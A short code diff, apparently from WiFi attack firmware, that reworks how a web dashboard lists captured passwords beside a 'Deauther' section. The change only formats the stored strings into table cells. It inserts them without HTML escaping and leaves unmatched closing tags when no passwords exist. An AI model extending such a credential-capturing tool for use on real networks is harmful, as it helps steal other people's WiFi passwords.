@@ -152,14 +152,20 @@ String dashboard(const String& indexLang, const String& favicon, const String& c
   
   //adds passwords to the table if one or more was entered
   if (allPass != "") {
-    _html += "<table style='text-align: center;'><tbody><tr><th>Password</th><th>Seconds after Bootup</th></tr>";
+    _html += "<table style='text-align: center;'><tbody><tr><th>Password</th><th>Seconds after Bootup</th></tr><tr><td>";
     
-    //add passwords from the storage
-    _html += allPass;
+    //"decodes" allpass string and add it to the table
+    for (int i = 0; i < allPass.length(); i++){
+      if (allPass[i] != '\n' && allPass[i] != '\t'){ _html += allPass[i]; } //if the char is not a special symbol that needs to be replaced add it to the field
+      else if (allPass[i] == '\t'){ _html += "</td><td>"; } //if char is a TAB char replace it with the html code for a new table cell
+      else if (allPass[i] == '\n'){ 
+        _html += "</td></tr>"; //add html code to close the cell
+        if (i + 1 - allPass.length() != 0){ _html += "<tr><td>"; } //if this is not the last char in the allpass string start a new cell
+      }
+    }
 
-    _html += "</tbody></table>";
   } else { _html += "<p><b style='margin: 7px 0px 7px 18px;'>No Passwords Captured yet!</b></p>"; }
-  _html += "</div>";
+  _html += "</tbody></table></div>";
 
   //Deauther part on the website
   _html += "<div><h1>Deauther</h1><div class='button-container'>";
